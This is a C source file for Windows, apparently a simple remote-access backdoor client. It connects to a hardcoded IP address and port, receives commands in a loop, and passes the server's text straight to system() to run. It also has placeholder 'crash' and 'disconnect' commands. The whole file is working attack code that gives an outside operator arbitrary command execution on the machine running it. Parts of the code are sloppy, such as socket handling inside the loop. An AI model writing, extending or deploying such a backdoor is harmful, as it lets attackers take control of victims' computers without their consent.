#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define HOST "26.199.90.194"
#define PORT 12345


int main() {
    WSADATA wsaData;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &wsaData);
    if (wsResult != 0) {
        printf("WSAStartup failed: %d\n", wsResult);
            // return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        printf("Socket failed: %ld\n", WSAGetLastError());
        WSACleanup();
            // return 1;
    }

    printf("Client started...\n");

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &addr.sin_addr.s_addr);


    while (1) {
        int connectResult = connect(clientSocket, (struct sockaddr*)&addr, sizeof(addr));
        if (connectResult == SOCKET_ERROR) {
            printf("Connect failed: %ld\n", WSAGetLastError());
            closesocket(clientSocket);
            WSACleanup();
            // return 1;
        }

        char data[1024];

        int bytesReceived = recv(clientSocket, data, 1024, 0);
        
        if (bytesReceived > 0) {
            char* serverAnswer = strtok(data, " ");
            if (serverAnswer != NULL) {
                if (strcmp(serverAnswer, "run") == 0) {
                    serverAnswer = strtok(NULL, " ");
                    if (serverAnswer != NULL) {
                        if (strcmp(serverAnswer, "-s") == 0) {
                            serverAnswer = strtok(NULL, " ");
                            if (serverAnswer != NULL) {
                                char systemCommand[256];
                                sprintf(systemCommand, "C:\\Windows\\System32\\%s", serverAnswer);
                                system(systemCommand);
                                char answerForServer[256];
                                sprintf(answerForServer, "RUN: %s", serverAnswer);
                                send(clientSocket, answerForServer, strlen(answerForServer), 0);
                            }
                        } else {
                            system(serverAnswer);
                            char answerForServer[256];
                            sprintf(answerForServer, "RUN: %s", serverAnswer);
                            send(clientSocket, answerForServer, strlen(answerForServer), 0);
                        }
                    }
                } else if (strcmp(serverAnswer, "crash") == 0) {
                    char answerForServer[256];
                    sprintf(answerForServer, "crashing computer");
                    send(clientSocket, answerForServer, strlen(answerForServer), 0);
                    for (int a = 0; a < 21; a++) {
                        for (int b = 0; b < 10; b++) {
                            for (int c = 0; c < 10; c++) {
                                printf("%d %d %d\n", a, b, c);
                            }
                        }
                    }
                } else if (strcmp(serverAnswer, "schot") == 0) {
                    char answerForServer[256];
                    sprintf(answerForServer, "crashing computer");
                    send(clientSocket, answerForServer, strlen(answerForServer), 0);
                    for (int a = 0; a < 21; a++) {
                        for (int b = 0; b < 10; b++) {
                            for (int c = 0; c < 10; c++) {
                                printf("%d %d %d\n", a, b, c);
                            }
                        }
                    }
                } else if (strcmp(serverAnswer, "disconnect") == 0) {
                    break;
                } else {
                    char answerForServer[256];
                    sprintf(answerForServer, "Command not found");
                    send(clientSocket, answerForServer, strlen(answerForServer), 0);
                }
            }
        } else {
            printf("recv failed: %ld\n", WSAGetLastError());
        }
    closesocket(clientSocket);
    WSACleanup();
    }
    return 0;
}

void CommandRun(void) {

}